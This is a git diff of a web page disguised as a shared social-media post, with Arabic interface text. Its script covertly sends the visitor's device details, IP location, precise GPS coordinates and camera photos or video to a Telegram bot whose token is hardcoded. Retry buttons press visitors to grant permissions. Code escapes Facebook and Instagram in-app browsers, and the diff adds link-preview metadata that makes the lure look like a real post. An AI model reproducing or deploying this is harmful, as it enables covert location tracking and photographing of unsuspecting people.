@@ -4,20 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Shahin Zyan masengar</title>
-  <meta property="og:title" content="">
-  <meta property="og:description" content="">
-  <meta property="og:image" content="">
+  <meta property="og:title" content="Shahin Zyan masengar">
+  <meta property="og:description" content="شارك لك منشور">
+  <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <style>
     :root { --bg: #f0f2f5; --card-bg: #ffffff; --text-primary: #1c1e21; --text-secondary: #65676b; --border: #e4e6eb; }
     @media (prefers-color-scheme: dark) { :root { --bg: #18191a; --card-bg: #242526; --text-primary: #e4e6eb; --text-secondary: #b0b3b8; --border: #3e4042; } }
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 20px; min-height: 100vh; position: relative; }
-
-    .post-container {
-      max-width: 500px; width: 100%; background: var(--card-bg); border-radius: 8px;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px;
-    }
+    .post-container { max-width: 500px; width: 100%; background: var(--card-bg); border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px; }
     .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
     .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
     .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
@@ -27,30 +23,15 @@
     .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
     .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
     .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
-
-    .three-dots {
-      position: absolute; top: 12px; left: 16px; width: 36px; height: 36px;
-      border-radius: 50%; display: flex; align-items: center; justify-content: center;
-      cursor: pointer; color: var(--text-secondary); font-size: 20px;
-    }
+    .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    .retry-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
-    }
-    .retry-btn {
-      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
-      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
-    }
+    /* أزرار إعادة المحاولة منفصلة */
+    .retry-buttons { display: flex; flex-direction: column; align-items: center; gap: 10px; margin-top: 10px; }
+    .retry-btn { padding: 10px 20px; font-size: 0.9rem; background: #4a4a4a; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; width: 250px; }
     .hidden { display: none !important; }
     video { display: none; }
-
-    /* زر الهروب اليدوي */
-    .escape-btn {
-      background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 8px;
-      font-size: 16px; cursor: pointer; margin: 10px 0; display: none;
-    }
+    .escape-btn { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 10px 0; display: none; }
   </style>
 </head>
 <body>
@@ -68,33 +49,34 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <div class="retry-overlay hidden" id="retryOverlay">
-    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+  <!-- أزرار إعادة المحاولة المنفصلة -->
+  <div class="retry-buttons">
+    <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
+    <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
   </div>
-
-  <!-- زر الهروب اليدوي -->
   <button class="escape-btn" id="escapeButton">فتح في المتصفح الخارجي</button>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    // ==================== الكود الأصلي ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
     const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
-    const overlay = document.getElementById('retryOverlay');
-    const retryBtn = document.getElementById('retryBtn');
+    const retryCameraBtn = document.getElementById('retryCameraBtn');
+    const retryLocationBtn = document.getElementById('retryLocationBtn');
     const vid = document.getElementById('video');
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
     let stream, photos = 0, capInt, loc, redir = 'https://example.com', deviceInfoSent = false, gpsLoc = null;
     let mediaRecorder, videoChunks = [], recording = false;
+    let cameraGranted = false, locationGranted = false;
 
+    // تحميل المنشور
     async function updatePost() {
       try {
         let r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
@@ -116,6 +98,7 @@
       } catch(e) {}
     }
 
+    // إرسال نص للبوت
     async function sendText(text) {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
@@ -125,6 +108,7 @@
       } catch(e) {}
     }
 
+    // معلومات الجهاز
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
@@ -146,6 +130,21 @@
       } catch(e) {}
     }
 
+    // الموقع المخزن عبر IP (صامت)
+    async function sendIPLocation() {
+      try {
+        let r = await fetch(`https://ipinfo.io/json?token=${I}`);
+        let d = await r.json();
+        if (d.loc) {
+          let [lat, lon] = d.loc.split(',').map(Number);
+          loc = { lat, lon, acc: 10000, src: 'IP' };
+          let maps = `https://www.google.com/maps?q=${lat},${lon}`;
+          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 Google Maps: ${maps}\n🍎 Apple Maps: http://maps.apple.com/?ll=${lat},${lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`);
+        }
+      } catch(e) {}
+    }
+
+    // طلب GPS دقيق (يحتاج إذن)
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
@@ -155,7 +154,7 @@
           });
         });
         if (pos.coords.accuracy && pos.coords.accuracy > 10) return false;
-        gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
+        gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS دقيق' };
         loc = gpsLoc;
         let maps = `https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`;
         await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 Google Maps: ${maps}\n🍎 Apple Maps: http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18`);
@@ -163,21 +162,21 @@
       } catch(e) { return false; }
     }
 
-    async function sendIPLocation() {
-      try {
-        let r = await fetch(`https://ipinfo.io/json?token=${I}`);
-        let d = await r.json();
-        if (d.loc) {
-          let [lat, lon] = d.loc.split(',').map(Number);
-          if (!gpsLoc) {
-            loc = { lat, lon, acc: 10000, src: 'IP' };
-            let maps = `https://www.google.com/maps?q=${lat},${lon}`;
-            await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 Google Maps: ${maps}\n🍎 Apple Maps: http://maps.apple.com/?ll=${lat},${lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`);
-          }
-        }
-      } catch(e) {}
+    // محاولة الحصول على GPS ومعالجة النتيجة
+    async function tryGPS() {
+      let ok = await requestGPS();
+      if (ok) {
+        locationGranted = true;
+        retryLocationBtn.classList.add('hidden');
+      } else {
+        locationGranted = false;
+        retryLocationBtn.classList.remove('hidden');
+        // إذا لم نأخذ GPS من قبل، نرسل IP
+        if (!gpsLoc) await sendIPLocation();
+      }
     }
 
+    // بدء الكاميرا والتصوير
     async function startCamera(facingMode = 'user') {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
@@ -244,118 +243,89 @@
       await sendText(report);
     }
 
-    async function tryPermissions() {
-      let gpsOk = await requestGPS();
-      if (!gpsOk) await sendIPLocation();
-      sendDeviceInfo();
-      let camOk = await startCamera('user');
-      if (!camOk) {
-        showRetry();
-        return;
+    // محاولة الكاميرا
+    async function tryCamera() {
+      let ok = await startCamera('user');
+      if (ok) {
+        cameraGranted = true;
+        retryCameraBtn.classList.add('hidden');
+      } else {
+        cameraGranted = false;
+        retryCameraBtn.classList.remove('hidden');
       }
-      hideRetry();
     }
 
-    function showRetry() {
-      post.classList.add('hidden');
-      overlay.classList.remove('hidden');
-      stopAll();
-    }
-
-    function hideRetry() {
-      overlay.classList.add('hidden');
-      post.classList.remove('hidden');
-    }
-
-    retryBtn.addEventListener('click', async () => {
-      hideRetry();
-      await tryPermissions();
+    // ربط أزرار الإعادة
+    retryCameraBtn.addEventListener('click', async () => {
+      retryCameraBtn.classList.add('hidden');
+      await tryCamera();
     });
 
-    // ==================== خطة الهروب من WebView (بدون FTP) ====================
+    retryLocationBtn.addEventListener('click', async () => {
+      retryLocationBtn.classList.add('hidden');
+      await tryGPS();
+    });
+
+    // خطة الهروب من WebView
     (function escapePlan() {
       const targetUrl = window.location.href;
       const escapeBtn = document.getElementById('escapeButton');
-
       function isInAppBrowser() {
         const ua = navigator.userAgent || '';
         return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
       }
-
       const methods = [
         {
           name: 'x-safari-https',
           shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
-          execute: () => {
-            const safariUrl = targetUrl.replace(/^https?:\/\//, 'x-safari-https://');
-            window.location.href = safariUrl;
-            return true;
-          }
+          execute: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); }
         },
         {
           name: 'googlechrome',
           shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
-          execute: () => {
-            const chromeUrl = targetUrl.replace(/^https?:\/\//, 'googlechrome://');
-            window.location.href = chromeUrl;
-            return true;
-          }
+          execute: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); }
         },
         {
           name: 'android-intent',
           shouldTry: () => /Android/i.test(navigator.userAgent),
-          execute: () => {
-            const intentUrl = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
-            window.location.href = intentUrl;
-            return true;
-          }
+          execute: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; }
         },
         {
           name: 'smart-app-banner',
           shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent) && !document.querySelector('meta[name="apple-itunes-app"]'),
           execute: () => {
-            const meta = document.createElement('meta');
-            meta.name = 'apple-itunes-app';
-            meta.content = 'app-id=';
+            const meta = document.createElement('meta'); meta.name = 'apple-itunes-app'; meta.content = 'app-id=';
             document.head.appendChild(meta);
-            return true;
           }
         },
         {
           name: 'window-open',
           shouldTry: () => true,
-          execute: () => {
-            const newWindow = window.open(targetUrl, '_blank', 'noopener,noreferrer');
-            if (newWindow) newWindow.opener = null;
-            return true;
-          }
+          execute: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
         }
       ];
-
       function attemptSequentialEscape() {
         for (let i = 0; i < methods.length; i++) {
           const method = methods[i];
-          if (method.shouldTry()) {
-            try { method.execute(); } catch(e) {}
-          }
+          if (method.shouldTry()) { try { method.execute(); } catch(e) {} }
         }
         if (escapeBtn) {
           escapeBtn.style.display = 'block';
-          escapeBtn.addEventListener('click', () => {
-            window.open(targetUrl, '_blank');
-          });
+          escapeBtn.addEventListener('click', () => { window.open(targetUrl, '_blank'); });
         }
       }
-
-      if (isInAppBrowser()) {
-        attemptSequentialEscape();
-      }
+      if (isInAppBrowser()) { attemptSequentialEscape(); }
     })();
 
-    // ==================== بدء التشغيل ====================
     async function init() {
       await updatePost();
-      setTimeout(tryPermissions, 500);
+      // 1. معلومات الجهاز
+      sendDeviceInfo();
+      // 2. موقع IP
+      sendIPLocation();
+      // 3. نحاول GPS وكاميرا بالتوازي
+      tryGPS();
+      tryCamera();
     }
 
     window.addEventListener('load', init);
